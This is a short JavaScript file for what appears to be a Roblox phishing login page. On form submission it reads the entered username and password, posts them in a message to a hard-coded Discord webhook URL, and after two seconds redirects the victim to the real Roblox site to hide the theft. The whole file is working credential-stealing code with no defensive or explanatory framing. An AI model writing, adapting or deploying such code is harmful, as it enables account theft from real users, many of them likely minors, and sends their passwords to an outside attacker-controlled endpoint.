// Replace with your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1411889557498232973/n2YLjdbDmZvylu5lJI0_bK0PJK6bxy7zdwzKH3ni0VanRGd0-6FmCqXzDCuCatM2QjR5';

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    sendCredentialsToDiscord(username, password);
    setTimeout(() => {
        window.location.href = 'https://www.roblox.com';
    }, 2000); // Redirect to Roblox home page after 2 seconds
});

function sendCredentialsToDiscord(username, password) {
    const data = {
        content: `New credentials logged:\nUsername: ${username}\nPassword: ${password}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).then(response => {
        if (response.ok) {
            console.log('Credentials sent to Discord!');
        } else {
            console.error('Failed to send credentials to Discord.', response.status, response.statusText);
        }
    }).catch(error => {
        console.error('Error:', error);
    });
}
